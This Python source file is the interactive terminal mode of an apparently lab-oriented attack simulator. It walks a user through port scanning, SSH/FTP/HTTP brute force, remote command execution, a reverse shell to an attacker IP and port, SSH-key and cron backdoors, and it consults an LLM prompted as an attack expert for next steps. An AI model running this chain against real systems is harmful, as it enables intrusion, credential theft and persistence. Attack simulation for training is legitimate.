#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Created on Wed May 20 19:07:00 2026
@author: hounsousamuel

Mode interactif terminal — l'user contrôle chaque étape manuellement.
Réutilise les fonctions pures de graph_nodes sans LangGraph.
Affichage : rich | Input : prompt_toolkit
"""

import os, sys
sys.path.insert(1, os.path.dirname(os.path.abspath(os.path.join(__file__, "..", ".."))))
import time
import json5
import asyncio
from typing import Dict, Any, List, Optional, Tuple

# ── rich ──────────────────────────────────────────────────────────────────────
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.text import Text
from rich.rule import Rule
from rich import box

# ── prompt_toolkit ────────────────────────────────────────────────────────────
from prompt_toolkit import PromptSession
from prompt_toolkit.history import InMemoryHistory
from prompt_toolkit.auto_suggest import AutoSuggestFromHistory
from prompt_toolkit.completion import WordCompleter, FuzzyCompleter
from prompt_toolkit.formatted_text import HTML
from prompt_toolkit.styles import Style

# ── simulateur ────────────────────────────────────────────────────────────────
from simulateur_attaque_ia.orchestrator.auto_orchestrator import (
    SimulatorState, SimulatorError, SimulatorStep,
    DEFAULT_INPUT_DICT, SIMULATOR_STATE_KEYS
)
from simulateur_attaque_ia.core.docker_manager import DockerManager
from simulateur_attaque_ia.tactics.reconnaissance.port_scan_and_banner_grab import NetworkServiceDiscover
from simulateur_attaque_ia.tactics.initial_access import FTPBruteForce, HTTPBruteForce, SSHBruteForce
from simulateur_attaque_ia.tactics.execution.command_execution import CommandExecution
from simulateur_attaque_ia.tactics.execution.reverse_shell import ReverseShell
from simulateur_attaque_ia.tactics.persistence.ssh_key_backdoor import SSHKeyBackdoor
from simulateur_attaque_ia.tactics.persistence.cron_backdoor import CronBackdoor
from simulateur_attaque_ia.tactics.privilege_escalation import SudoExploit, SUIDBinary
from simulateur_attaque_ia.tactics.credential_access import PasswordFileDump, BashHistoryRead, SSHKeyTheft
from simulateur_attaque_ia.tactics.lateral_movement import SSHLateralMovement
from simulateur_attaque_ia.tactics.exfiltration import ExfiltrationHTTP
from simulateur_attaque_ia.tactics.defense_evasion import LogCleaner, Timestomp
from simulateur_attaque_ia.simulateur_utils.logger import get_logger
from simulateur_attaque_ia.orchestrator.prompts import build_prompt_decision, build_prompt_review
from simulateur_attaque_ia.orchestrator.actions import ALL_ACTIONS, ACTIONS_MAPPING
from simulateur_attaque_ia.orchestrator.llm_manager import LLMManager
from simulateur_attaque_ia.simulateur_utils.utils import silence_output
logger = get_logger()
console = Console()

# ── style prompt_toolkit ──────────────────────────────────────────────────────
PT_STYLE = Style.from_dict({
    "prompt":        "bold ansicyan",
    "prompt.arrow":  "bold ansiyellow",
    "completion-menu.completion":          "bg:#1a2d3a #c8dde8",
    "completion-menu.completion.current":  "bg:#00d4ff #000000 bold",
    "auto-suggestion":                     "ansibrightblack italic",
})

# ── session globale prompt_toolkit ────────────────────────────────────────────
_session = PromptSession(
    history=InMemoryHistory(),
    auto_suggest=AutoSuggestFromHistory(),
    style=PT_STYLE,
    mouse_support=False,
)

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
CONFIG_DIR     = os.path.join(BASE_DIR, "data", "config")
os.makedirs(CONFIG_DIR, exist_ok=True)

# ─────────────────────────────────────────────────────────────────────────────
# Helpers affichage (rich)
# ─────────────────────────────────────────────────────────────────────────────

def _banner():
    console.print()
    console.print(Panel.fit(
        Text("🛡  ShieldAI Simulateur attaque — Mode Interactif Terminal", justify="center", style="bold cyan"),
        border_style="cyan", padding=(1, 6),
    ))
    console.print()


def _section(title: str):
    console.print()
    console.print(Rule(f"[bold cyan]{title}[/bold cyan]", style="cyan"))
    console.print()


def _ok(msg: str):   console.print(f"[bold green]✅ {msg}[/bold green]")
def _err(msg: str):  console.print(f"[bold red]❌ {msg}[/bold red]")
def _warn(msg: str): console.print(f"[bold yellow]⚠️  {msg}[/bold yellow]")
def _info(msg: str): console.print(f"[bold blue]ℹ  {msg}[/bold blue]")
def _dim(msg: str):  console.print(f"[dim]{msg}[/dim]")

def slow_print(text: str, style: str = "bold cyan", delay: float = 0.02):
    """Affiche le texte lettre par lettre avec Rich — pour l'ambiance."""
    for char in text:
        console.print(char, style=style, end="", highlight=False, soft_wrap=True)
        time.sleep(delay)
    console.print()

def _table_ports(open_ports: List[int], scan_result: Dict) -> Table:
    t = Table(title="Ports ouverts", box=box.ROUNDED, border_style="cyan", show_lines=True)
    t.add_column("Port",    style="bold cyan",  justify="right")
    t.add_column("Service", style="bold green")
    t.add_column("Banner",  style="dim white",  no_wrap=False, max_width=60)
    for port in open_ports:
        info    = scan_result.get(port, {})
        service = info.get("service", "unknown")
        banner  = info.get("banner", "").strip().replace("\r\n", " ")[:80]
        t.add_row(str(port), service, banner)
    return t


def _table_creds(creds: Dict[int, Any], service: str) -> Table:
    """Tableau credentials (SSH/FTP) ou paths (HTTP)."""
    if service.lower() == "http":
        t = Table(title="Paths HTTP trouvés", box=box.ROUNDED,
                  border_style="green", show_lines=True)
        t.add_column("Port",   style="bold cyan",   justify="right")
        t.add_column("Path",   style="bold green")
        t.add_column("Status", style="bold yellow", justify="center")
        for port, result in creds.items():
            for cred in result.get("results", {}).get("founds", []):
                path   = cred.get("url", cred.get("path", ""))
                status = cred.get("status", 200)
                t.add_row(str(port), path, str(status))
    else:
        t = Table(title=f"Credentials {service.upper()}", box=box.ROUNDED,
                  border_style="green", show_lines=True)
        t.add_column("Port",     style="bold cyan", justify="right")
        t.add_column("Username", style="bold green")
        t.add_column("Password", style="bold red")
        for port, result in creds.items():
            for cred in result.get("results", {}).get("founds", []):
                t.add_row(str(port), cred.get("username", ""), cred.get("password", ""))
    return t


def _table_commands(cmd_results: Dict) -> Table:
    t = Table(title="Résultats commandes", box=box.ROUNDED,
              border_style="blue", show_lines=True)
    t.add_column("Commande", style="bold cyan",  max_width=30)
    t.add_column("RC",       justify="center",   width=4)
    t.add_column("Stdout",   style="dim white",  max_width=60)
    for cmd, res in cmd_results.get("results", {}).get("commands", {}).items():
        rc     = res.get("returncode", -1)
        stdout = str(res.get("stdout", "")).strip()[:200]
        rc_txt = Text(str(rc), style="green" if rc == 0 else "red")
        t.add_row(cmd, rc_txt, stdout)
    return t


# ─────────────────────────────────────────────────────────────────────────────
# Helpers input (prompt_toolkit)
# ─────────────────────────────────────────────────────────────────────────────

async def _ask(prompt: str, default: str = "",
               completer: WordCompleter = None,
               password: bool = False) -> str:
    """Input async avec prompt_toolkit — flèche haut = historique, Tab = complétion."""
    default_hint = f" [{default}]" if default else ""
    prompt_html  = HTML(f"<prompt.arrow>➜</prompt.arrow> <prompt>{prompt}{default_hint}: </prompt>")
    try:
        val = await _session.prompt_async(
            prompt_html,
            completer=FuzzyCompleter(completer) if completer else None,
            is_password=password,
        )
        return val.strip() or default
    except (EOFError, KeyboardInterrupt):
        return default


async def _ask_int(prompt: str, default: int) -> int:
    raw = await _ask(prompt, str(default))
    try:
        return int(raw)
    except ValueError:
        _warn(f"Entrée invalide → {default}")
        return default


async def _ask_float(prompt: str, default: float) -> float:
    raw = await _ask(prompt, str(default))
    try:
        return float(raw)
    except ValueError:
        _warn(f"Entrée invalide → {default}")
        return default


async def _ask_bool(prompt: str, default: bool = True) -> bool:
    hint    = "O/n" if default else "o/N"
    raw     = await _ask(f"{prompt} ({hint})", "o" if default else "n",
                         completer=WordCompleter(["o", "n", "oui", "non"]))
    return raw.lower() in ("o", "oui", "y", "yes", "1", "true")


async def _ask_list(prompt: str, default: List[str] = None,
                    completer: WordCompleter = None) -> List[str]:
    default_str = ",".join(default) if default else ""
    raw = await _ask(f"{prompt} (séparés par virgules)", default_str, completer=completer)
    if not raw:
        return default or []
    return [x.strip() for x in raw.split(",") if x.strip()]


async def _ask_choice(prompt: str, choices: List[Tuple[str, str]],
                      default: str = None, force:bool = False) -> str:
    """Affiche un menu numéroté avec complétion automatique."""
    t = Table(box=box.SIMPLE, show_header=False, padding=(0, 2))
    t.add_column("N", style="bold cyan", width=10)
    t.add_column("Option", style="white")
    for key, label in choices:
        marker = " ◀ défaut" if key == default else ""
        t.add_row(key, label + f"[dim]{marker}[/dim]")
    console.print(t)
    
    if not force:
        keys      = [c[0] for c in choices]
        comp      = WordCompleter(keys)
        choice    = await _ask(prompt, default or keys[0], completer=comp)
        if choice not in keys:
            _warn(f"Choix invalide → {default or keys[0]}")
            return default or keys[0]
    else:
        while True:
             keys      = [c[0] for c in choices]
             comp      = WordCompleter(keys)
             choice    = await _ask(prompt, default or keys[0], completer=comp)
             if choice not in keys:
                 _warn("Choix invalide.")   
                 continue
             break
    return choice


# ─────────────────────────────────────────────────────────────────────────────
# Classe principale
# ─────────────────────────────────────────────────────────────────────────────

class InteractiveTerminalOrchestrator:
    """
    Mode interactif terminal.
    L'user contrôle chaque étape — scan, bruteforce, exécution, persistence.
    Réutilise les tactics directement, sans LangGraph.
    """

    def __init__(
        self,
        llm: LLMManager | None,
        docker_manager: DockerManager,
        config_path: str = None,
        debug: bool = False,
    ):
        from copy import deepcopy
        self.docker_manager = docker_manager
        self.debug = debug
        self.conf: Dict[str, Any] = deepcopy(DEFAULT_INPUT_DICT)
        self.final_result = {"state": {}, "steps_results": {}}

        if config_path:
            self.load_conf(config_path)
        
        self.llm = llm

    # ── config ────────────────────────────────────────────────────────────────

    def load_conf(self, path: str):
        full_path = os.path.join(CONFIG_DIR, path)
        try:
            with open(full_path, "r") as f:
                data = json5.load(f)
                self.conf.update({k: v for k, v in data.items() if k in SIMULATOR_STATE_KEYS})
            _ok(f"Config chargée : {full_path}")
        except FileNotFoundError:
            _warn(f"Config introuvable : {full_path} — valeurs par défaut")
        except Exception as e:
            _warn(f"Erreur config : {e}")

    def _get_conf(self, key: str, default=None):
        return self.conf.get(key, default)
    def _set_conf(self, key: str, value):
        self.conf[key] = value
    
    async def ask_llm_decision(self) -> str:
        """Demande à l'IA de proposer la prochaine action."""
        if self.llm is None:
            return "Assistant indisponible"
        
        prompt = build_prompt_decision(
            self.final_result.get('steps_results', {}),
            self.conf
        )
        system = (
            "Tu es un expert en attaque cyber. Analyse l'état et décide de la "
            "prochaine action. Réponds UNIQUEMENT par le nom de l'action.\n"
        )
        
        response = await self.llm.call(
            system=system,
            prompt=prompt,
            max_tokens=50,
            temperature=0.0,
        )
        
        if response.get("success", False):
            action = response.get('response', '').strip().lower().replace("_", "")
            for a in ALL_ACTIONS:
                if action in a.strip().lower().replace("_", ""):
                    return ACTIONS_MAPPING[a]
            return ""
        
        return ""
    
    async def ask_llm_review(self, user_action: str) -> str:
        """Demande à l'IA de donner son avis sur la proposition de l'utilisateur."""
        if self.llm is None:
            return "Assistant indisponible"
        prompt = build_prompt_review(
            self.final_result.get('steps_results', {}),
            self.conf,
            user_action
        )
        system = "Tu es un expert en attaque cyber. Donne un avis concis et utile."
        
        response = await self.llm.call(
            system=system,
            prompt=prompt,
            max_tokens=500,
            temperature=0.7,
        )
        
        default = "Je n'ai pas d'avis sur cette action."
        return response.get('response', default).strip() if response.get("success", False) else default
    
    # ── état ──────────────────────────────────────────────────────────────────

    def print_state(self):
        """Affiche un résumé de l'état courant de la simulation."""
        _section("📊 État courant")
        table = Table(box=box.SIMPLE, show_header=False, padding=(0, 2))
        table.add_column("Clé",    style="bold cyan", min_width=32)
        table.add_column("Valeur", style="white")
 
        sr = self.final_result.get("steps_results", {})
 
        # IP
        table.add_row("IP cible", str(self._get_conf("ip", "—")))
 
        # Recon
        reco = sr.get("NetworkServiceDiscover|Reconnaissance")
        ports = reco[0].get("result", {}).get("results", {}).get("open_ports", []) if reco else []
        table.add_row("Ports ouverts", str(ports) if ports else "[dim]Non scanné[/dim]")
 
        # Initial Access
        cred_count = sum(
            len(e.get("result", {}).get("results", {}).get("founds", []))
            for key, entries in sr.items() if "InitialAccess" in key
            for e in entries
        )
        table.add_row("Credentials trouvés", str(cred_count))
 
        # Execution
        cmd_count = sum(
            len(e.get("result", {}).get("results", {}).get("commands", {}))
            for key, entries in sr.items() if "CommandExecution" in key
            for e in entries
        )
        table.add_row("Commandes exécutées", str(cmd_count))
 
        # PrivEsc
        privesc_ok = any(
            e.get("result", {}).get("results", {}).get("success_number", 0) > 0
            for key, entries in sr.items() if "PrivilegeEscalation" in key
            for e in entries
        )
        table.add_row("Privilege Escalation", "✅ root obtenu" if privesc_ok else "[dim]Non tenté / échoué[/dim]")
 
        # Credential Access
        hashes = sum(
            e.get("result", {}).get("results", {}).get("hashes_count", 0)
            for key, entries in sr.items() if "PasswordFileDump" in key
            for e in entries
        )
        creds_hist = sum(
            e.get("result", {}).get("results", {}).get("credentials_count", 0)
            for key, entries in sr.items() if "BashHistoryRead" in key
            for e in entries
        )
        keys_stolen = sum(
            e.get("result", {}).get("results", {}).get("usable_keys_count", 0)
            for key, entries in sr.items() if "SSHKeyTheft" in key
            for e in entries
        )
        table.add_row("Hashes extraits",         str(hashes)      if hashes      else "[dim]—[/dim]")
        table.add_row("Creds bash history",       str(creds_hist)  if creds_hist  else "[dim]—[/dim]")
        table.add_row("Clés SSH volées",          str(keys_stolen) if keys_stolen else "[dim]—[/dim]")
 
        # Lateral Movement
        compromised = sum(
            e.get("result", {}).get("results", {}).get("compromised_count", 0)
            for key, entries in sr.items() if "LateralMovement" in key
            for e in entries
        )
        table.add_row("Hosts compromis (lateral)", str(compromised) if compromised else "[dim]—[/dim]")
 
        # Exfiltration
        sent = sum(
            e.get("result", {}).get("results", {}).get("sent_count", 0)
            for key, entries in sr.items() if "Exfiltration" in key
            for e in entries
        )
        table.add_row("Payloads exfiltrés", str(sent) if sent else "[dim]—[/dim]")
 
        # Defense Evasion
        evasion_done = any("DefenseEvasion" in key for key in sr)
        table.add_row("Defense Evasion", "✅ Traces effacées" if evasion_done else "[dim]Non effectué[/dim]")
 
        # Persistence
        bd_count = sum(1 for key in sr if "Persistence" in key)
        table.add_row("Backdoors installées", str(bd_count))
 
        console.print(table)

    # ── reconnaissance ────────────────────────────────────────────────────────

    async def reconnaissance(self) -> Dict:
        _section("🔍 Reconnaissance — Port Scan")

        timeout_socket = await _ask_float(
            "Timeout socket par port (s)",
            self._get_conf("network_discover_timeout_socket", 0.2)
        )

        # Port range
        existing = self._get_conf("network_discover_port_range")
        if existing:
            nb = len(existing) if isinstance(existing, list) else len(list(existing))
            _dim(f"Config actuelle : {nb} ports")
            choice = await _ask_choice("Action :", [
                ("0", "Utiliser les ports de la config"),
                ("1", "Remplacer"),
                ("2", "Ajouter"),
            ], default="0")
        else:
            choice = "1"

        if choice == "0":
            port_range = list(existing) if not isinstance(existing, list) else existing
        else:
            _dim("Format range : début,fin,pas (ex: 1,1000,1)")
            _dim("Format liste : 22,80,443,8080")
            while True:
                raw = await _ask("Entrez les ports")
                if not raw:
                    _warn("Entrée requise")
                    continue
                parts = [p.strip() for p in raw.split(",")]
                if len(parts) == 3 and all(p.isdigit() for p in parts):
                    port_range = list(range(int(parts[0]), int(parts[1]) + 1, int(parts[2])))
                else:
                    port_range = []
                    for p in parts:
                        try:    port_range.append(int(p))
                        except: _warn(f"Ignoré : {p}")
                if port_range:
                    break
                _warn("Aucun port valide, réessayez")

            if choice == "2" and existing:
                port_range = list(set(list(existing) + port_range))
            
        port_range = [p for p in port_range if 0 <= p <= 65535]
        self._set_conf("network_discover_port_range", port_range)
        nb      = len(port_range)
        preview = port_range[:20]
        suffix  = f"... (+{nb - 20})" if nb > 20 else ""
        _dim(f"{nb} ports à scanner : {preview}{suffix}")

        n_discover = NetworkServiceDiscover(timeout_socket=timeout_socket)
        ip         = self._get_conf("ip")

        with console.status(f"[bold cyan]Scan de {ip}...[/bold cyan]", spinner="dots"):
            with silence_output() as (out, err):
                n_result = await n_discover.scan_async(ip, port_range=port_range)

        open_ports  = n_result["results"]["open_ports"]
        scan_result = n_result["results"]["scan_result"]

        if open_ports:
            _ok(f"{len(open_ports)} port(s) ouvert(s)")
            console.print(_table_ports(open_ports, scan_result))
        else:
            _err("Aucun port ouvert trouvé")

        self.final_result["steps_results"]["NetworkServiceDiscover|Reconnaissance"] = [
            {"result": n_result, "port": None, "ip": ip}
        ]

        return {
            "open_ports":    open_ports,
            "scan_result":   scan_result,
            "port_function": {
                func: [p for p in open_ports
                       if func in scan_result.get(p, {}).get("service", "").lower()]
                for func in ["ssh", "ftp", "http"]
            },
            "continue": bool(open_ports),
        }

    # ── initial access ────────────────────────────────────────────────────────

    async def initial_access(self, scan_data: Dict) -> Dict:
        _section("🔑 Initial Access — Bruteforce")

        open_ports    = scan_data["open_ports"]
        port_function = scan_data["port_function"]

        if not open_ports:
            _err("Aucun port ouvert")
            return {"credentials": {}, "continue": False}

        # Params globaux
        timeout    = await _ask_float("Timeout connexion (s)", self._get_conf("initial_access_timeout", 5.0))
        delay      = await _ask_float("Délai entre tentatives (s)", self._get_conf("initial_access_delay", 0.2))
        max_att    = await _ask_int("Max tentatives", self._get_conf("initial_access_max_attempts", 50))
        add_common = await _ask_bool("Combiner avec les creds communs ?",
                                     self._get_conf("initial_access_add_common", True))
        self._set_conf("initial_access_timeout",      timeout)
        self._set_conf("initial_access_delay",        delay)
        self._set_conf("initial_access_max_attempts", max_att)
        self._set_conf("initial_access_add_common",   add_common)

        services_map = {"ssh": SSHBruteForce, "ftp": FTPBruteForce, "http": HTTPBruteForce}
        all_creds: Dict[str, Dict] = {}

        for function, ports in port_function.items():
            if not ports:
                _dim(f"Pas de ports {function.upper()} — ignoré")
                continue

            _section(f"Service {function.upper()} — {len(ports)} port(s)")

            if not await _ask_bool(f"Attaquer {function.upper()} ?", True):
                continue

            func_class   = services_map[function]
            usernames: List[str] = []
            passwords: List[str] = []
            paths: List[str]     = []
            preference           = "http://"
            total_timeout        = None

            # ── SSH total_timeout ──
            if function == "ssh":
                raw_tt = await _ask("Total timeout SSH (vide = illimité)", "")
                total_timeout = float(raw_tt) if raw_tt else None

            # ── Usernames / Passwords (SSH + FTP) ──
            if function in ("ssh", "ftp"):
                key_u = f"{function}_brute_force_usernames"
                key_p = f"{function}_brute_force_passwords"

                existing_u = self._get_conf(key_u, [])
                if existing_u:
                    _dim(f"Usernames config : {existing_u[:5]}{'...' if len(existing_u) > 5 else ''}")
                    ch = await _ask_choice("Action :", [
                        ("0", "Garder"), ("1", "Remplacer"), ("2", "Ajouter")
                    ], default="0")
                    if ch == "1":
                        usernames = await _ask_list(f"Usernames {function.upper()}",
                                                    ["root", "admin", "test"])
                        self._set_conf(key_u, usernames)
                    elif ch == "2":
                        new_u = await _ask_list("Usernames à ajouter")
                        usernames = list(set(existing_u + new_u))
                        self._set_conf(key_u, usernames)
                    else:
                        usernames = existing_u
                else:
                    usernames = await _ask_list(f"Usernames {function.upper()}",
                                                ["root", "admin", "test"])
                    self._set_conf(key_u, usernames)

                existing_p = self._get_conf(key_p, [])
                if existing_p:
                    _dim(f"Passwords config : {existing_p[:5]}{'...' if len(existing_p) > 5 else ''}")
                    ch = await _ask_choice("Action :", [
                        ("0", "Garder"), ("1", "Remplacer"), ("2", "Ajouter")
                    ], default="0")
                    if ch == "1":
                        passwords = await _ask_list(f"Passwords {function.upper()}",
                                                    ["password", "123456", "admin"])
                        self._set_conf(key_p, passwords)
                    elif ch == "2":
                        new_p = await _ask_list("Passwords à ajouter")
                        passwords = list(set(existing_p + new_p))
                        self._set_conf(key_p, passwords)
                    else:
                        passwords = existing_p
                else:
                    passwords = await _ask_list(f"Passwords {function.upper()}",
                                                ["password", "123456", "admin"])
                    self._set_conf(key_p, passwords)

            # ── HTTP ──
            if function == "http":
                existing_pref = self._get_conf("http_brute_force_preference", "http")
                _dim(f"Scheme actuel : {existing_pref}")
                if await _ask_bool("Changer le scheme ?", False):
                    preference = "https://" if existing_pref == "http" else "http://"
                    self._set_conf("http_brute_force_preference", preference)
                else:
                    preference = existing_pref

                existing_paths = self._get_conf("http_brute_force_paths", [])
                if existing_paths:
                    _dim(f"Paths config : {existing_paths[:5]}{'...' if len(existing_paths) > 5 else ''}")
                    ch = await _ask_choice("Action :", [
                        ("0", "Garder"), ("1", "Remplacer"), ("2", "Ajouter")
                    ], default="0")
                    if ch == "1":
                        paths = await _ask_list("Paths HTTP", ["/admin", "/login", "/api"])
                    elif ch == "2":
                        new_p = await _ask_list("Paths à ajouter")
                        paths = list(set(existing_paths + new_p))
                    else:
                        paths = existing_paths
                else:
                    paths = await _ask_list("Paths HTTP", ["/admin", "/login", "/api"])

                paths = ["/" + p.strip("/") for p in paths]
                self._set_conf("http_brute_force_paths", paths)
                _ok(f"Paths : {paths}")

            # ── Choix des ports ──
            if len(ports) > 1:
                _dim(f"Ports disponibles : {ports}")
                ch = await _ask_choice("Ports à tester :", [
                    ("0", "Tous"), ("1", "Choisir")
                ], default="0")
                if ch == "1":
                    raw = await _ask("Ports (virgules)")
                    selected = []
                    for p in raw.split(","):
                        try:    selected.append(int(p.strip()))
                        except: pass
                    ports_to_test = [p for p in selected if p in ports] or ports
                else:
                    ports_to_test = ports
            else:
                ports_to_test = ports

            # ── Lancement ──
            all_creds[function] = {}
            for port in ports_to_test:
                with console.status(f"[bold cyan]{function.upper()} bruteforce port {port}...[/bold cyan]", spinner="dots"):
                    with silence_output() as (out, err):
                        if function in ("ssh", "ftp"):
                            classe = func_class(
                                total_timeout=total_timeout,
                                timeout=timeout,
                                delay=delay,
                                max_attempts=max_att
                            )
                            attaque_result = await classe.find_all_async(
                                ip=self._get_conf("ip"),
                                port=port,
                                add_common=add_common,
                                usernames=usernames,
                                passwords=passwords,
                            )
                        elif function == "http":
                            classe = func_class(timeout=timeout, preference=preference)
                            attaque_result = await classe.find_all_async(
                                url=self._get_conf("ip"),
                                port=port,
                                add_common=add_common,
                                paths=paths,
                            )

                    if self.debug and out.getvalue():
                        console.print(f"[dim]{out.getvalue()[:500]}[/dim]")

                all_creds[function][port] = attaque_result
                key = f"{function.replace('_', ' ').title().replace(' ', '')}BruteForce|InitialAccess"

                founds = attaque_result.get("results", {}).get("founds", [])
                if founds:
                    _ok(f"Port {port} — {len(founds)} credential(s) trouvé(s) !")
                else:
                    _err(f"Port {port} — aucun credential trouvé")

                self.final_result["steps_results"].setdefault(key, []).append({
                    "result": attaque_result,
                    "port": port,
                    "ip": self._get_conf("ip"),
                })

        # Tableau récap
        for function, ports_res in all_creds.items():
            if any(r.get("results", {}).get("founds") for r in ports_res.values()):
                console.print(_table_creds(ports_res, function))

        return {"credentials": all_creds, "continue": bool(all_creds)}

    # ── execution ─────────────────────────────────────────────────────────────

    async def execution(self, credentials: Dict) -> Dict:
        _section("⚡ Execution — Commandes & Reverse Shell")

        ssh_creds: List[Dict] = []
        for port, result in credentials.get("ssh", {}).items():
            for cred in result.get("results", {}).get("founds", []):
                ssh_creds.append({"port": port, **cred})

        if not ssh_creds:
            _err("Aucun credential SSH")
            return {"continue": False}

        t = Table(title="Credentials SSH", box=box.ROUNDED, border_style="cyan")
        t.add_column("#", style="bold cyan", width=3)
        t.add_column("Port",     style="bold cyan")
        t.add_column("Username", style="bold green")
        t.add_column("Password", style="bold red")
        for i, c in enumerate(ssh_creds):
            t.add_row(str(i), str(c["port"]), c["username"], c["password"])
        console.print(t)

        idx = await _ask_int("Choisir le credential (#)", 0)
        if idx >= len(ssh_creds): idx = 0
        cred = ssh_creds[idx]
        _ok(f"Utilisation : {cred['username']}:{cred['password']} @ port {cred['port']}")

        ip       = self._get_conf("ip")
        port     = int(cred["port"])
        username = cred["username"]
        password = cred["password"]

        timeout      = await _ask_float("Timeout connexion (s)",  self._get_conf("command_execution_timeout", 2.0))
        exec_timeout = await _ask_float("Timeout exécution (s)",  self._get_conf("command_execution_exec_timeout", 10.0))
        add_common   = await _ask_bool("Ajouter commandes recon par défaut ?", True)
        quick        = await _ask_bool("Mode quick ?", True)

        # Complétion avec des commandes communes
        cmd_comp    = WordCompleter(["whoami", "id", "uname -a", "hostname", "pwd",
                                     "ls -la", "cat /etc/passwd", "ps aux", "env",
                                     "netstat -tuln", "ifconfig", "ip a"])
        custom_cmds = await _ask_list("Commandes supplémentaires (vide = aucune)", [],
                                      completer=cmd_comp)

        with console.status("[bold cyan]Exécution des commandes...[/bold cyan]", spinner="dots"):
            with silence_output():
                cmd_exec   = CommandExecution(timeout=timeout, exec_timeout=exec_timeout)
                cmd_result = await cmd_exec.exec_command_async(
                    ip=ip, port=port,
                    username=username, password=password,
                    commands=custom_cmds,
                    add_common=add_common,
                    quick=quick,
                )

        console.print(_table_commands(cmd_result))
        self.final_result["steps_results"].setdefault("CommandExecution|Execution", []).append({
            "result": cmd_result, "port": port, "ip": ip
        })

        # ── Reverse Shell ──
        if await _ask_bool("Lancer un Reverse Shell ?", False):
            _section("Reverse Shell")
            att_ip      = await _ask("IP attaquant", self._get_conf("reverse_shell_attaquant_ip", "172.17.0.1"))
            att_port    = await _ask_int("Port attaquant", self._get_conf("reverse_shell_attaquant_port", 4444))
            rs_timeout  = await _ask_float("Timeout connexion (s)", self._get_conf("reverse_shell_timeout", 2.0))
            rs_exec     = await _ask_float("Timeout exécution (s)", self._get_conf("reverse_shell_exec_timeout", 30.0))
            rs_listener = await _ask_float("Timeout listener (s)", self._get_conf("reverse_shell_listener_timeout", 15.0))
            rs_total    = await _ask_float("Total timeout (s)", self._get_conf("reverse_shell_total_timeout", 60.0))

            default_cmds = self._get_conf("reverse_shell_commands", ["whoami", "id", "hostname"])
            _dim(f"Commandes par défaut : {default_cmds}")
            ch = await _ask_choice("Action :", [
                ("0", "Garder"), ("1", "Remplacer"), ("2", "Ajouter")
            ], default="0")
            if ch == "1":
                rs_cmds = await _ask_list("Commandes", default_cmds, completer=cmd_comp)
            elif ch == "2":
                extra   = await _ask_list("Commandes à ajouter", [], completer=cmd_comp)
                rs_cmds = list(set(default_cmds + extra))
            else:
                rs_cmds = default_cmds
            self._set_conf("reverse_shell_commands", rs_cmds)

            with console.status("[bold cyan]Reverse shell...[/bold cyan]", spinner="dots"):
                with silence_output():
                    rs        = ReverseShell(timeout=rs_timeout, exec_timeout=rs_exec)
                    rs_result = await rs.reverse_async(
                        ip=ip, port=port,
                        attaquant_ip=att_ip, attaquant_port=att_port,
                        username=username, password=password,
                        commands=rs_cmds,
                        timeout=rs_listener,
                        total_timeout=rs_total,
                    )

            if rs_result.get("severity") == "HIGH":
                _ok("Reverse shell réussi !")
            else:
                _err("Reverse shell échoué")

            att_res = rs_result.get("results", {}).get("attaquant_result", {})
            if att_res.get("success_commands"):
                t = Table(title="Commandes réussies", box=box.ROUNDED, border_style="green", show_lines=True)
                t.add_column("Commande", style="cyan")
                t.add_column("Stdout", style="white", max_width=60)
                for r in att_res["success_commands"]:
                    t.add_row(r.get("cmd", ""), r.get("stdout", "").strip()[:200])
                console.print(t)
 
            self.final_result["steps_results"].setdefault("ReverseShell|Execution", []).append({
                "result": rs_result, "port": port, "ip": ip
            })

        return {"ssh_creds": ssh_creds, "selected_cred": cred, "continue": True}

    # ── persistence ───────────────────────────────────────────────────────────

    async def persistence(self, exec_data: Dict) -> Dict:
        _section("💾 Persistence — Backdoors")

        cred = exec_data.get("selected_cred")
        if not cred:
            _err("Aucun credential")
            return {"continue": False}

        ip       = self._get_conf("ip")
        port     = int(cred["port"])
        username = cred["username"]
        password = cred["password"]
        _dim(f"Cred actif : {username}:{password} @ {ip}:{port}")

        installed: List[str] = []

        # ── SSH Key ──
        if await _ask_bool("Installer backdoor SSH Key ?", True):
            algo_comp    = WordCompleter(["Ed25519", "RSA", "ECDSA"])
            algo         = await _ask("Algorithme (Ed25519/RSA/ECDSA)",
                                      self._get_conf("ssh_key_algo", "Ed25519"),
                                      completer=algo_comp)
            timeout      = await _ask_float("Timeout (s)", self._get_conf("ssh_key_timeout", 2.0))
            exec_timeout = await _ask_float("Exec timeout (s)", self._get_conf("ssh_key_exec_timeout", 5.0))

            with console.status("[bold cyan]Injection clé SSH...[/bold cyan]", spinner="dots"):
                with silence_output():
                    ssh_key    = SSHKeyBackdoor(timeout=timeout, exec_timeout=exec_timeout)
                    key_result = await ssh_key.inject_key_async(
                        ip=ip, port=port,
                        username=username, password=password,
                        algo=algo,
                    )

            if key_result.get("results", {}).get("success"):
                _ok("Clé SSH injectée !")
                installed.append("ssh_key")
            else:
                _err("Échec injection clé SSH")

            self.final_result["steps_results"].setdefault("SshKeyBackdoor|Persistence", []).append({
                "result": key_result, "port": port, "ip": ip
            })

        # ── Cron ──
        if await _ask_bool("Installer backdoor Cron ?", True):
            if not self.docker_manager:
                _warn("docker_manager non disponible — ignoré")
            else:
                script_path = await _ask("Chemin script", self._get_conf("cron_script_path", "/opt/backdoor.sh"))
                cron_expr   = await _ask("Expression cron", self._get_conf("cron_expression", "*/1 * * * *"))
                level       = await _ask_choice("Niveau :", [
                    ("simple", "Simple"), ("advanced", "Avancé")
                ], default="simple")
                self._set_conf("created_files", [script_path])
                self._set_conf("cron_script_path", script_path)
                self._set_conf("cron_expression",  cron_expr)

                with console.status("[bold cyan]Cron backdoor...[/bold cyan]", spinner="dots"):
                    with silence_output():
                        cron        = CronBackdoor()
                        cron_result = cron.cron_inject(
                            docker_manager=self.docker_manager,
                            script_path=script_path,
                            cron_expression=cron_expr,
                            level=level,
                        )

                if cron_result.get("results", {}).get("inject", {}).get("success"):
                    _ok("Cron installé !")
                    installed.append("cron")
                else:
                    _err("Échec cron")

                self.final_result["steps_results"].setdefault("CronBackdoor|Persistence", []).append({
                    "result": cron_result, "port": "docker", "ip": ip
                })

        if installed:
            _ok(f"Backdoors : {', '.join(installed)}")
        else:
            _warn("Aucune backdoor installée")

        return {"installed": installed, "continue": True}
    
    async def privilege_escalation(self, exec_data: Dict) -> Dict:
        _section("⚡ Privilege Escalation — Sudo & SUID")
        slow_print("🔓 Recherche de vecteurs d'élévation de privilèges...", style="bold yellow", delay=0.02)
 
